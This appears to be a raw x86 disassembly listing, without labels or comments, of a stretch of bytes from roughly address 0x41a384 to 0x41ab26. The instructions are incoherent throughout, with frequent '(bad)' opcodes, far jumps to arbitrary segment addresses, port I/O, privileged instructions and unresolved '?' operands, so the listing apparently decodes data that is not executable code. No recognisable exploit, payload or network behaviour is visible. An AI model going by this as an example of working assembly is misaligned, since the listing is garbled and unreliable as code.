  41a384:	retf   0x5ac
  41a387:	xlat   BYTE PTR ds:[ebx]
  41a388:	fadd   QWORD PTR [esi-0x7207e9c1]
  41a38e:	addr16 or eax,0x110be9c8
  41a394:	xchg   ebx,eax
  41a395:	cwde   
  41a396:	pop    ebp
  41a397:	outs   dx,DWORD PTR ds:[esi]
  41a398:	gs and eax,0x9b0339b8
  41a39e:	jmp    0xc15fe077
  41a3a3:	dec    esp
  41a3a4:	stos   DWORD PTR es:[edi],eax
  41a3a5:	outs   dx,DWORD PTR ds:[esi]
  41a3a6:	je     0x41a3cf
  41a3a8:	stos   DWORD PTR es:[edi],eax
  41a3a9:	dec    edx
  41a3aa:	cmc    
  41a3ab:	outs   dx,DWORD PTR ds:[esi]
  41a3ac:	add    BYTE PTR [ebx+ebx*8-0x60d4e857],ah
  41a3b3:	ffree  st(6)
  41a3b5:	rcr    DWORD PTR [ecx],1
  41a3b7:	mov    esi,DWORD PTR [ebx]
  41a3b9:	not    DWORD PTR [ebp-0xa]
  41a3bc:	test   DWORD PTR [ecx-0xaddff3d],edx
  41a3c2:	repz sub al,0x88
  41a3c5:	mov    DWORD PTR [edi+0x21],edx
  41a3c8:	xor    dh,BYTE PTR [ecx]
  41a3ca:	stc    
  41a3cb:	lahf   
  41a3cc:	xor    al,0xc5
  41a3ce:	jb     0x41a449
  41a3d0:	dec    esi
  41a3d1:	sbb    edx,ecx
  41a3d3:	outs   dx,BYTE PTR ds:[esi]
  41a3d4:	mov    edi,0xbd661592
  41a3d9:	hlt    
  41a3da:	shr    DWORD PTR [ebp-0x32506114],0xae
  41a3e1:	and    DWORD PTR [ecx-0x2],edx
  41a3e4:	push   0xffffffcd
  41a3e6:	icebp  
  41a3e7:	std    
  41a3e8:	mov    ds:0xb8bc75a9,eax
  41a3ed:	mov    esi,DWORD PTR [eax]
  41a3ef:	mov    ebx,0x47cf5128
  41a3f4:	jmp    0x6ec0:0x64aceb66
  41a3fb:	push   esi
  41a3fc:	pop    es
  41a3fd:	push   ebp
  41a3fe:	das    
  41a3ff:	ss inc esp
  41a401:	push   esp
  41a402:	sbb    eax,0x18002765
  41a407:	mov    dl,0xc4
  41a409:	sub    esp,ebp
  41a40b:	adc    edx,ecx
  41a40d:	jb     0x41a413
  41a40f:	(bad)  [edi]
  41a411:	fsubr  QWORD PTR [edx+0xc]
  41a414:	xchg   esp,eax
  41a415:	xor    al,0x1
  41a417:	lds    ebp,FWORD PTR [ebp+0x7f]
  41a41a:	fwait
  41a41b:	ss sbb ch,ch
  41a41e:	sub    ebx,DWORD PTR ds:0xac8117dd
  41a424:	pop    esp
  41a425:	xchg   DWORD PTR [esi],ebx
  41a427:	retf   0xffef
  41a42a:	dec    ebp
  41a42b:	les    edi,FWORD PTR [ebp+0x55a53274]
  41a431:	xor    eax,0xfc3df986
  41a436:	fwait
  41a437:	imul   ecx,DWORD PTR ds:0xe2d7ce3b,0x291031f
  41a441:	call   0xecdf4123
  41a446:	and    eax,0xc316990c
  41a44b:	js     0x41a496
  41a44d:	mov    ecx,ebx
  41a44f:	add    ah,dh
  41a451:	inc    ebp
  41a452:	fidivr DWORD PTR [ecx+eax*4-0x53]
  41a456:	aas    
  41a457:	aad    0x4b
  41a459:	mov    edi,0x1fe339ce
  41a45e:	mov    ebx,eax
  41a460:	outs   dx,BYTE PTR ds:[esi]
  41a461:	mov    bl,0x8b
  41a463:	jae    0x41a407
  41a465:	push   ds
  41a466:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a467:	add    BYTE PTR [ebp+0x13],bl
  41a46a:	sahf   
  41a46b:	sub    al,0x2a
  41a46d:	jge    0x41a47c
  41a46f:	dec    eax
  41a470:	xor    DWORD PTR [edx],0x5dced4b9
  41a476:	jo     0x41a486
  41a478:	pop    es
  41a479:	pop    edi
  41a47a:	out    dx,al
  41a47b:	outs   dx,DWORD PTR ds:[esi]
  41a47c:	retf   0xa42
  41a47f:	sbb    ch,BYTE PTR ds:0x3d7b7816
  41a485:	cmp    DWORD PTR [edi+0x6bf8454e],0x7db2abe6
  41a48f:	xchg   esi,eax
  41a490:	lock or eax,0x46e448b8
  41a496:	mov    ecx,ebp
  41a498:	cmp    DWORD PTR [ecx],eax
  41a49a:	add    bl,BYTE PTR [ebp+0x64]
  41a49d:	dec    ebp
  41a49e:	push   cs
  41a49f:	test   DWORD PTR [ebp+ebx*2-0x4b],ebx
  41a4a3:	add    BYTE PTR [esi-0x15855141],ch
  41a4a9:	pop    edx
  41a4aa:	sbb    ah,bh
  41a4ac:	xchg   ebx,eax
  41a4ad:	add    eax,0x5f978e97
  41a4b2:	jge    0x41a45c
  41a4b4:	icebp  
  41a4b5:	xor    ch,BYTE PTR [edi-0x3b]
  41a4b8:	in     eax,0x5
  41a4ba:	and    al,0x97
  41a4bc:	stos   DWORD PTR es:[edi],eax
  41a4bd:	or     eax,0xb20519f4
  41a4c2:	xchg   esi,eax
  41a4c3:	jge    0x41a502
  41a4c5:	push   ebx
  41a4c6:	or     cl,BYTE PTR [eax+ebx*1+0x6]
  41a4ca:	or     esi,DWORD PTR [ebx-0x7b2548c8]
  41a4d0:	push   edx
  41a4d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4d2:	in     eax,0x57
  41a4d4:	cli    
  41a4d5:	push   eax
  41a4d6:	cmc    
  41a4d7:	pop    ebp
  41a4d8:	mov    bl,0x2f
  41a4da:	mov    esp,0x50c13d02
  41a4df:	dec    ebx
  41a4e0:	xor    DWORD PTR [eax],ebx
  41a4e2:	hlt    
  41a4e3:	jmp    0xef31:0xcf3bcb4b
  41a4ea:	mov    BYTE PTR [edx-0x3a4807de],dh
  41a4f0:	rcl    DWORD PTR [edx],cl
  41a4f2:	mov    gs,WORD PTR [ecx]
  41a4f4:	imul   esp,DWORD PTR [edx],0xc477ae65
  41a4fa:	sub    DWORD PTR [esi+0x2ff8ca88],esp
  41a500:	sbb    DWORD PTR [ebx-0x51],ebp
  41a503:	pop    ebp
  41a504:	mov    DWORD PTR [eax+ebx*2],0x7074e2b6
  41a50b:	jbe    0x41a524
  41a50d:	push   ss
  41a50e:	mov    ecx,0x364b69f1
  41a513:	sar    BYTE PTR [edi-0x75],0x90
  41a517:	sub    BYTE PTR [ebp+0x1d],cl
  41a51a:	add    eax,0xc39c09f1
  41a51f:	xchg   bh,bl
  41a521:	aad    0x96
  41a523:	psadbw mm1,mm6
  41a526:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a527:	mov    bl,0xbd
  41a529:	fimul  WORD PTR [edi-0x329400a2]
  41a52f:	or     dl,BYTE PTR [ecx]
  41a531:	mov    ecx,0x855681d7
  41a536:	pusha  
  41a537:	pop    edi
  41a538:	pop    es
  41a539:	cdq    
  41a53a:	test   BYTE PTR [edi+ecx*2-0x5],bh
  41a53e:	mov    cl,0x7f
  41a540:	xchg   ecx,eax
  41a541:	dec    ebp
  41a542:	mov    esi,0x140ad1a
  41a547:	xlat   BYTE PTR ds:[ebx]
  41a548:	(bad)  
  41a549:	sbb    DWORD PTR ss:[edi],0xfffffffe
  41a54d:	repz js 0x41a58a
  41a550:	xchg   ecx,eax
  41a551:	push   eax
  41a552:	add    edx,DWORD PTR [ebx-0x3b5c44e2]
  41a558:	sbb    ebx,DWORD PTR [ecx-0x2c]
  41a55b:	ror    al,0x9f
  41a55e:	nop
  41a55f:	dec    edi
  41a560:	inc    edi
  41a561:	fcomp  DWORD PTR [ebx-0x24]
  41a564:	cmc    
  41a565:	test   al,0x43
  41a567:	jecxz  0x41a4fb
  41a569:	jmp    0x8f6b:0x560bed17
  41a570:	fstp   TBYTE PTR [esi-0x43e10fd5]
  41a576:	arpl   ax,cx
  41a578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a579:	and    dl,BYTE PTR [edx-0x2c]
  41a57c:	rcl    BYTE PTR es:[ecx+0x66],1
  41a580:	icebp  
  41a581:	fld    QWORD PTR [edi+0x8]
  41a584:	(bad)  
  41a585:	cld    
  41a586:	inc    edx
  41a587:	mov    ecx,0x8967281f
  41a58c:	std    
  41a58d:	mov    ch,0x16
  41a58f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a590:	stos   BYTE PTR es:[edi],al
  41a591:	xchg   edi,eax
  41a592:	daa    
  41a593:	or     DWORD PTR [edx],ecx
  41a595:	mov    edx,0x81c90e83
  41a59a:	cmp    ch,ch
  41a59c:	xor    cl,al
  41a59e:	sar    BYTE PTR [eax-0x7a8d8d75],cl
  41a5a4:	push   ebp
  41a5a5:	fimul  WORD PTR [ebx-0x1b515aa7]
  41a5ab:	mov    bl,0x3b
  41a5ad:	xor    al,0x30
  41a5af:	inc    edi
  41a5b0:	test   al,0x1b
  41a5b2:	lods   eax,DWORD PTR ds:[esi]
  41a5b3:	scas   eax,DWORD PTR es:[edi]
  41a5b4:	test   al,0x5c
  41a5b6:	inc    edi
  41a5b7:	add    bh,bh
  41a5b9:	cdq    
  41a5ba:	xchg   ecx,eax
  41a5bb:	push   0x61908906
  41a5c0:	std    
  41a5c1:	fist   WORD PTR [esp+ebp*2-0x58]
  41a5c5:	xchg   esi,eax
  41a5c6:	push   ebx
  41a5c7:	loop   0x41a5d0
  41a5c9:	mov    bh,0x14
  41a5cb:	sti    
  41a5cc:	inc    esi
  41a5cd:	mov    ?,WORD PTR [eax-0x32]
  41a5d0:	xchg   ebx,eax
  41a5d1:	aas    
  41a5d2:	out    dx,al
  41a5d3:	mov    edi,0xffe89e09
  41a5d8:	imul   edx,DWORD PTR [ecx-0x3d],0x834b2413
  41a5df:	lahf   
  41a5e0:	out    dx,eax
  41a5e1:	xlat   BYTE PTR ds:[ebx]
  41a5e2:	add    DWORD PTR [eax+0x48],ebp
  41a5e5:	jecxz  0x41a595
  41a5e7:	aam    0xc0
  41a5e9:	mov    cl,BYTE PTR ds:0x1295c2bd
  41a5ef:	lods   al,BYTE PTR ds:[esi]
  41a5f0:	(bad)  
  41a5f1:	in     eax,0xac
  41a5f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5f4:	pop    edi
  41a5f5:	push   0x46
  41a5f7:	xchg   BYTE PTR [ecx-0x73f8214e],bh
  41a5fd:	push   es
  41a5fe:	retf   0x415e
  41a601:	imul   esi,DWORD PTR [eax-0x75690fba],0x80fd06f9
  41a60b:	or     eax,0x5febc9e7
  41a610:	mov    eax,ds:0xe7f2bf54
  41a615:	or     DWORD PTR [eax+edi*2-0x3d],ebp
  41a619:	adc    eax,0x6f68cfa9
  41a61e:	and    al,0xfb
  41a620:	jb     0x41a5dd
  41a622:	sbb    esi,edi
  41a624:	neg    BYTE PTR [edx-0x67]
  41a627:	dec    ebp
  41a628:	call   0x3800:0x523e07a5
  41a62f:	and    ah,BYTE PTR [ebx-0x5c]
  41a632:	int3   
  41a633:	nop
  41a634:	out    0x13,eax
  41a636:	(bad)  
  41a637:	data16 rol BYTE PTR [edx+ecx*1],1
  41a63b:	aad    0xa2
  41a63d:	and    edi,DWORD PTR [eax]
  41a63f:	aam    0x61
  41a641:	call   DWORD PTR [ebx-0x369e849d]
  41a647:	or     al,0x0
  41a649:	outs   dx,DWORD PTR ds:[esi]
  41a64a:	pop    edx
  41a64b:	not    BYTE PTR [ecx]
  41a64d:	loopne 0x41a5d3
  41a64f:	loop   0x41a6ad
  41a651:	inc    ebx
  41a652:	sbb    edx,DWORD PTR [esi+ebx*1-0x124cbe9d]
  41a659:	cdq    
  41a65a:	adc    ebp,DWORD PTR [esi+eiz*4+0x3c2f89ea]
  41a661:	push   ss
  41a662:	pop    ecx
  41a663:	push   edi
  41a664:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a665:	push   esp
  41a666:	push   0x59
  41a668:	sbb    eax,0x519072d0
  41a66d:	cwde   
  41a66e:	xchg   ebp,eax
  41a66f:	jle    0x41a695
  41a671:	sahf   
  41a672:	jle    0x41a6de
  41a674:	mov    ah,0xe0
  41a676:	mov    WORD PTR [esi+0x17],ss
  41a679:	inc    eax
  41a67a:	or     dl,BYTE PTR [ebx+0x31]
  41a67d:	xor    eax,0xe4ef8219
  41a682:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a683:	fcom   QWORD PTR ds:0x75c74927
  41a689:	jbe    0x41a6e5
  41a68b:	mov    edi,0x2c8976c7
  41a690:	iret   
  41a691:	add    bl,BYTE PTR [edx+ebx*8]
  41a694:	mov    ah,0x86
  41a696:	inc    eax
  41a697:	mov    ds:0xebe15b0e,al
  41a69c:	pop    ecx
  41a69d:	in     eax,0x6
  41a69f:	pop    ss
  41a6a0:	retf   0x8047
  41a6a3:	lds    edi,FWORD PTR [ebp+0x31e0c66c]
  41a6a9:	cmc    
  41a6aa:	adc    esp,DWORD PTR [ecx+0x2b]
  41a6ad:	div    BYTE PTR [edi+0x266e8585]
  41a6b3:	jb     0x41a655
  41a6b5:	push   esi
  41a6b6:	pusha  
  41a6b7:	mov    al,ds:0xf6e285ad
  41a6bc:	dec    edi
  41a6bd:	inc    esi
  41a6be:	loope  0x41a739
  41a6c0:	xor    al,0xe7
  41a6c2:	xlat   BYTE PTR ds:[ebx]
  41a6c3:	xor    bl,BYTE PTR [esi]
  41a6c5:	mov    ebp,0xc0fac539
  41a6ca:	cli    
  41a6cb:	xor    DWORD PTR [edi+0x38314dc2],0xc351ac02
  41a6d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6d6:	mov    esi,0x490a8d7
  41a6db:	jae    0x41a6be
  41a6dd:	mov    dl,0x24
  41a6df:	sbb    DWORD PTR [esi],ebp
  41a6e1:	inc    ebx
  41a6e2:	in     al,dx
  41a6e3:	idiv   BYTE PTR [esi]
  41a6e5:	or     eax,DWORD PTR [esi+0x0]
  41a6e8:	xchg   ebx,eax
  41a6e9:	pusha  
  41a6ea:	xchg   DWORD PTR [eax+eiz*4-0x7],ebp
  41a6ee:	lock shr BYTE PTR ds:0xb4f8a20d,cl
  41a6f5:	xchg   esp,eax
  41a6f6:	(bad)  
  41a6f7:	test   al,0x89
  41a6f9:	pop    ebp
  41a6fa:	adc    BYTE PTR [ecx],dh
  41a6fc:	dec    esi
  41a6fd:	mov    eax,ds:0xea013467
  41a702:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a703:	push   ebp
  41a704:	call   0x801436a5
  41a709:	clc    
  41a70a:	rcl    DWORD PTR [ebp-0x1a69a68b],1
  41a710:	(bad)  
  41a712:	sbb    DWORD PTR [ebp+0x5ed94164],ebp
  41a718:	fstp   TBYTE PTR [ecx+0x1203818d]
  41a71e:	imul   ebp,DWORD PTR [ecx+0x1106fb1b],0xffffffd3
  41a725:	pop    esi
  41a726:	dec    ebp
  41a727:	shr    BYTE PTR [eax],1
  41a729:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a72a:	jbe    0x41a6e3
  41a72c:	dec    esi
  41a72d:	add    eax,0xaffbe762
  41a732:	(bad)  
  41a734:	xchg   ecx,eax
  41a735:	mov    ch,0x7e
  41a737:	jmp    0x6282daec
  41a73c:	stc    
  41a73d:	lea    edi,ds:[ebx+ebp*1-0x28]
  41a742:	pop    es
  41a743:	jno    0x41a7aa
  41a745:	in     eax,dx
  41a746:	sub    bl,BYTE PTR ds:0xe1cff1cc
  41a74c:	jmp    0x57fa593
  41a751:	cld    
  41a752:	retf   0x9323
  41a755:	sbb    eax,0x248f5d5f
  41a75a:	test   DWORD PTR [edx],edi
  41a75c:	es aad 0x2e
  41a75f:	mov    esp,0xcdbb2abb
  41a764:	pusha  
  41a765:	xchg   edx,eax
  41a766:	mov    dh,0x65
  41a768:	mov    WORD PTR [esi-0x3330c17d],fs
  41a76e:	es cmp al,0x49
  41a771:	and    al,0xcb
  41a773:	adc    DWORD PTR [ebp+0x64bf188a],eax
  41a779:	push   ss
  41a77a:	bound  eax,QWORD PTR [ebp-0x808a50]
  41a780:	xor    ebx,DWORD PTR [ebx+0x1c3ccc1e]
  41a786:	repz es jge 0x41a7e6
  41a78a:	xor    BYTE PTR [edx-0x6dbe073d],bl
  41a790:	std    
  41a791:	jno    0x41a7b9
  41a793:	aad    0x72
  41a795:	imul   esp,DWORD PTR [eax+0x6e684877],0xbee98149
  41a79f:	outs   dx,BYTE PTR ds:[esi]
  41a7a0:	mov    edi,0xe5672dea
  41a7a5:	and    eax,0x4e43ec41
  41a7aa:	fwait
  41a7ab:	rcr    DWORD PTR [ebx-0x31],1
  41a7ae:	ds xchg ebx,eax
  41a7b0:	jmp    0x79c5a0a2
  41a7b5:	adc    bh,al
  41a7b7:	pop    ebx
  41a7b8:	or     esi,esp
  41a7ba:	xor    eax,DWORD PTR [edi-0x5584d309]
  41a7c0:	xchg   ecx,eax
  41a7c1:	daa    
  41a7c2:	movq   QWORD PTR [edx+edx*1],mm3
  41a7c6:	mov    BYTE PTR [ecx-0x4ded9423],bl
  41a7cc:	mov    ds:0x937e31f9,al
  41a7d1:	pop    edx
  41a7d2:	cmc    
  41a7d3:	pop    ebp
  41a7d4:	pop    esi
  41a7d5:	mov    ds:0xbd776998,eax
  41a7da:	and    al,0xcf
  41a7dc:	xor    eax,0x1b7026d5
  41a7e1:	jmp    0xb1dd:0x980fca59
  41a7e8:	sbb    ch,bh
  41a7ea:	pop    ebx
  41a7eb:	repnz push ds
  41a7ed:	pop    ebx
  41a7ee:	iret   
  41a7ef:	outs   dx,BYTE PTR ds:[esi]
  41a7f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7f1:	jp     0x41a792
  41a7f3:	mov    esp,0xb0b9f76d
  41a7f8:	enter  0xd3a5,0xc5
  41a7fc:	xor    DWORD PTR [ebx+0x28],edx
  41a7ff:	(bad)  
  41a800:	cld    
  41a801:	fs int3 
  41a803:	xor    ecx,DWORD PTR [esp+ebp*8-0x5b44044f]
  41a80a:	inc    ebx
  41a80b:	push   ebx
  41a80c:	pop    DWORD PTR [esi-0x63239a8c]
  41a812:	jp     0x41a7fc
  41a814:	daa    
  41a815:	jmp    0x41a843
  41a817:	inc    ecx
  41a818:	or     eax,0xb2f794f
  41a81d:	inc    esp
  41a81e:	loop   0x41a7ac
  41a820:	cli    
  41a821:	lea    esi,[edx+0x12222f00]
  41a827:	mov    ebp,0x1264a84c
  41a82c:	jle    0x41a84e
  41a82e:	add    DWORD PTR [ebp+esi*8+0x31f7a575],ebx
  41a835:	mul    BYTE PTR ds:0x6f149a9
  41a83b:	jmp    FWORD PTR [ebx+0x45]
  41a83e:	cmp    DWORD PTR [esi-0x35],esi
  41a841:	int3   
  41a842:	sub    DWORD PTR [ebp-0x63],eax
  41a845:	mov    ecx,DWORD PTR [esi+0x4c3821e3]
  41a84b:	loop   0x41a88f
  41a84d:	or     dh,BYTE PTR [edx+0x71]
  41a850:	sbb    al,0x8f
  41a852:	pop    eax
  41a853:	push   es
  41a854:	sub    BYTE PTR [edi],bh
  41a856:	ret    
  41a857:	mov    WORD PTR [ebp-0x62884c03],ds
  41a85d:	imul   esi,ebp,0x4f54252e
  41a863:	int3   
  41a864:	mov    ebp,0xd357b0c8
  41a869:	rcr    DWORD PTR [esi],cl
  41a86b:	ret    
  41a86c:	neg    BYTE PTR [esi+0x6c]
  41a86f:	mov    al,ds:0x62eeb7a8
  41a874:	gs xchg ebp,eax
  41a876:	repz fcomp QWORD PTR [esi-0x5ae8e5f1]
  41a87d:	out    dx,al
  41a87e:	and    al,0xe9
  41a880:	ror    BYTE PTR [ebx+0xe],0x30
  41a884:	or     ah,al
  41a886:	cli    
  41a887:	scas   eax,DWORD PTR es:[edi]
  41a888:	mov    BYTE PTR [edx+0x59],ch
  41a88b:	mov    ebx,0x23e656d4
  41a890:	popf   
  41a891:	inc    ebx
  41a892:	add    al,0x8e
  41a894:	sahf   
  41a895:	push   0x68
  41a897:	jmp    0x41a880
  41a899:	jo     0x41a90f
  41a89b:	push   eax
  41a89c:	adc    DWORD PTR [eax-0x60],edx
  41a89f:	in     al,0x3f
  41a8a1:	xchg   edi,eax
  41a8a2:	loop   0x41a8e4
  41a8a4:	fsub   QWORD PTR [ecx+0x5]
  41a8a7:	push   ebp
  41a8a8:	and    edi,DWORD PTR [ebp+0x4a]
  41a8ab:	dec    ebp
  41a8ac:	ins    BYTE PTR es:[edi],dx
  41a8ad:	adc    al,0x3a
  41a8af:	(bad)
  41a8b3:	ret    0xfbc0
  41a8b6:	dec    ecx
  41a8b7:	push   0x66
  41a8b9:	ins    DWORD PTR es:[edi],dx
  41a8ba:	ror    BYTE PTR [edi-0x248d63fd],cl
  41a8c0:	xor    al,0xd8
  41a8c3:	mov    ds:0x4792fd1b,eax
  41a8c8:	xchg   edi,edx
  41a8ca:	(bad)  
  41a8cb:	mov    WORD PTR [edx+0x564fb1be],?
  41a8d1:	lds    edx,FWORD PTR [esi+0x547205ae]
  41a8d7:	repnz xchg edx,eax
  41a8d9:	push   ecx
  41a8da:	sbb    ebp,DWORD PTR [esi-0x64ecf7fb]
  41a8e0:	sub    bh,bl
  41a8e2:	loop   0x41a867
  41a8e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8e5:	inc    esi
  41a8e6:	test   DWORD PTR [ebx-0x7e],esi
  41a8e9:	cmp    eax,DWORD PTR [edi+0x15acb686]
  41a8ef:	jmp    0xb6ca:0xa78147ba
  41a8f6:	scas   al,BYTE PTR es:[edi]
  41a8f7:	lahf   
  41a8f8:	stos   DWORD PTR es:[edi],eax
  41a8f9:	mov    ds:0x26c79062,eax
  41a8fe:	retf   0xcf8a
  41a901:	dec    edx
  41a902:	jno    0x41a91e
  41a904:	or     esp,edx
  41a906:	mov    eax,DWORD PTR [edx]
  41a908:	push   edi
  41a909:	repnz adc eax,0xc7a40e98
  41a90f:	add    al,0x7a
  41a911:	arpl   WORD PTR [esp+esi*8+0x4a1c4c82],ax
  41a918:	shl    BYTE PTR [edi+esi*4],1
  41a91b:	mov    ds:0x7ffdd966,eax
  41a920:	popf   
  41a921:	fsub   QWORD PTR [eax]
  41a923:	adc    DWORD PTR [eax-0x72dcffaf],0xffffff8e
  41a92a:	adc    al,0xb7
  41a92c:	shl    BYTE PTR [esi-0xea305c9],cl
  41a932:	mov    ah,0xf7
  41a934:	je     0x41a8c4
  41a936:	inc    ebp
  41a937:	mov    dh,0x20
  41a939:	out    dx,al
  41a93a:	or     esi,DWORD PTR [ebp-0xd242d63]
  41a940:	int    0xdf
  41a942:	mov    BYTE PTR [eax],ah
  41a944:	inc    esp
  41a945:	pop    ebx
  41a946:	or     bh,BYTE PTR [ecx-0x59]
  41a949:	jg     0x41a95f
  41a94b:	es sub eax,0x17a379ee
  41a951:	push   esi
  41a952:	sar    dh,cl
  41a954:	pop    es
  41a955:	shl    BYTE PTR [ecx+0x6f],cl
  41a958:	xor    cl,cl
  41a95a:	inc    edx
  41a95b:	cmp    esp,DWORD PTR [ebp-0x54625dd]
  41a961:	fs jbe 0x41a969
  41a964:	add    eax,0xaa64a81a
  41a969:	xchg   ecx,eax
  41a96a:	lahf   
  41a96b:	mov    ebp,0xbd5420b9
  41a970:	test   eax,0x92d8bd13
  41a975:	mov    edi,DWORD PTR [ebx+edx*4]
  41a978:	stos   BYTE PTR es:[edi],al
  41a979:	test   DWORD PTR [edi-0x2c],ecx
  41a97c:	add    BYTE PTR [ecx+0x17b2e9d5],ch
  41a982:	and    al,0x6f
  41a984:	adc    eax,0x7757a4d6
  41a989:	stos   BYTE PTR es:[edi],al
  41a98a:	dec    esp
  41a98b:	dec    eax
  41a98c:	add    cl,BYTE PTR ds:0x5146f888
  41a992:	scas   eax,DWORD PTR es:[edi]
  41a993:	sbb    dl,BYTE PTR [ecx]
  41a995:	pop    ecx
  41a996:	retf   
  41a997:	in     al,0xc3
  41a999:	lods   eax,DWORD PTR ds:[esi]
  41a99a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a99b:	mov    edi,0x67638455
  41a9a0:	ret    0x7df1
  41a9a3:	push   ecx
  41a9a4:	push   ss
  41a9a5:	mov    bl,0xb7
  41a9a7:	mov    eax,ds:0x60a3130
  41a9ac:	rcr    BYTE PTR [eax+edx*8+0x6f3f6a],0x97
  41a9b4:	adc    dl,BYTE PTR [ebp-0x7f2b328]
  41a9ba:	mov    edx,eax
  41a9bc:	add    eax,DWORD PTR [ecx-0x45]
  41a9bf:	and    dh,BYTE PTR [edi-0x13]
  41a9c2:	mov    esp,0x7a9a4ec
  41a9c7:	jo     0x41a976
  41a9c9:	push   0xc587587c
  41a9ce:	int    0xc3
  41a9d0:	inc    edi
  41a9d1:	push   0x96b69c97
  41a9d6:	xchg   esp,eax
  41a9d7:	jmp    0x129ef328
  41a9dc:	xor    ecx,DWORD PTR [edi]
  41a9de:	mov    cl,0xec
  41a9e0:	cmc    
  41a9e1:	clc    
  41a9e2:	mov    edi,0xd6895bdb
  41a9e7:	jmp    0x41a9f6
  41a9e9:	xchg   BYTE PTR cs:[ecx],bh
  41a9ec:	pop    eax
  41a9ed:	std    
  41a9ee:	ins    DWORD PTR es:[edi],dx
  41a9ef:	cs sub cl,ch
  41a9f2:	icebp  
  41a9f3:	xchg   edi,eax
  41a9f4:	mov    ecx,0x76a5ee2e
  41a9f9:	jle    0x41a990
  41a9fb:	mov    al,0xb3
  41a9fd:	aas    
  41a9fe:	pop    ecx
  41a9ff:	jmp    0x5a58c78b
  41aa04:	sub    BYTE PTR [edx],al
  41aa06:	jne    0x41aa5f
  41aa08:	inc    esp
  41aa09:	mov    ds:0xd18ba4c0,eax
  41aa0e:	daa    
  41aa0f:	jb     0x41aa84
  41aa11:	dec    ebx
  41aa12:	cmp    BYTE PTR [esi-0x7a],al
  41aa15:	pop    ss
  41aa16:	jo     0x41aa03
  41aa18:	xor    al,0xe9
  41aa1a:	pop    eax
  41aa1b:	or     al,0x14
  41aa1d:	(bad)  
  41aa1f:	cli    
  41aa20:	add    eax,0xa8e501e
  41aa25:	sbb    eax,0xcd3cff0c
  41aa2a:	es xchg esi,eax
  41aa2c:	gs sbb al,0xe1
  41aa2f:	push   eax
  41aa30:	inc    ebx
  41aa31:	push   ebx
  41aa32:	pushf  
  41aa33:	cs mov cl,0xae
  41aa36:	xor    eax,0xe69e58e1
  41aa3b:	push   0xe5159661
  41aa40:	test   eax,0xb6b42c20
  41aa45:	fild   DWORD PTR [esi-0x2ebe4639]
  41aa4b:	imul   DWORD PTR [edx+0x75]
  41aa4e:	inc    ebp
  41aa4f:	iret   
  41aa50:	mov    esp,0x3566bb94
  41aa55:	jmp    0xb7c4:0x1387321d
  41aa5c:	and    DWORD PTR [eax-0x25],ebp
  41aa5f:	mov    ecx,0x7719f470
  41aa64:	dec    ebx
  41aa65:	cdq    
  41aa66:	xchg   esi,eax
  41aa67:	icebp  
  41aa68:	js     0x41aa3d
  41aa6a:	stos   BYTE PTR es:[edi],al
  41aa6b:	xchg   ebp,eax
  41aa6c:	cmp    al,0x20
  41aa6e:	jmp    0x41aa12
  41aa70:	or     BYTE PTR [eax-0x630e4a53],dl
  41aa76:	(bad)  
  41aa77:	lock inc edi
  41aa79:	sbb    DWORD PTR [edx+ebx*2],ecx
  41aa7c:	add    DWORD PTR [ebx],esi
  41aa7e:	cwde   
  41aa7f:	mov    ebx,0xfed21d3e
  41aa84:	dec    esp
  41aa85:	ja     0x41aa6a
  41aa87:	mov    ch,0xf6
  41aa89:	jnp    0x41aa46
  41aa8b:	dec    ebp
  41aa8c:	aam    0x70
  41aa8e:	sbb    BYTE PTR [ebx+eax*2],dl
  41aa91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa92:	fsubr  st(1),st
  41aa94:	in     eax,0xe5
  41aa96:	lahf   
  41aa97:	retf   0xd37b
  41aa9a:	jle    0x41aa4c
  41aa9c:	mov    BYTE PTR [ebp-0x26],al
  41aa9f:	mov    ds:0xe71fc535,eax
  41aaa4:	arpl   WORD PTR [ebp+0x3bd6d8ee],cx
  41aaaa:	jbe    0x41ab27
  41aaac:	cmp    DWORD PTR [ecx+0x4ef661a0],0x9aa360ac
  41aab6:	add    DWORD PTR [eax+0x1f],edi
  41aab9:	cld    
  41aaba:	push   eax
  41aabb:	jmp    0x41ab03
  41aabd:	iret   
  41aabe:	daa    
  41aabf:	ret    0xf770
  41aac2:	(bad)  
  41aac3:	call   0xbe93:0x260f2d1f
  41aaca:	inc    edx
  41aacb:	cdq    
  41aacc:	sar    DWORD PTR [ecx],0x82
  41aacf:	adc    al,BYTE PTR [edi+0x4b76a9de]
  41aad5:	lock mov edx,0x6bb0fdf2
  41aadb:	xchg   ecx,eax
  41aadc:	push   edx
  41aadd:	(bad)  
  41aade:	retf   0xfc92
  41aae1:	pop    sp
  41aae3:	call   0x3bab337f
  41aae8:	sbb    ecx,ebx
  41aaea:	push   cs
  41aaeb:	(bad)  
  41aaec:	adc    eax,0x91faf6e1
  41aaf1:	add    al,0x5
  41aaf3:	jae    0x41aaa0
  41aaf5:	mov    esi,0xd1893db6
  41aafa:	jns    0x41aac4
  41aafc:	xor    BYTE PTR [esi+0x8cb6b2c],0xe4
  41ab03:	and    eax,0xd0726ee8
  41ab08:	(bad)  
  41ab09:	mov    al,0xed
  41ab0b:	je     0x41ab0f
  41ab0d:	sub    BYTE PTR [edx+0x608cf633],al
  41ab13:	pusha  
  41ab14:	sar    BYTE PTR [eax+0x54816b9e],cl
  41ab1a:	ds jmp 0x41ab8a
  41ab1d:	(bad)  
  41ab1e:	shr    DWORD PTR [eax-0x3272723d],1
  41ab24:	outs   dx,DWORD PTR ds:[esi]
  41ab25:	cdq    
  41ab26:	sbb    eax,DWORD PTR [ecx-0x10]
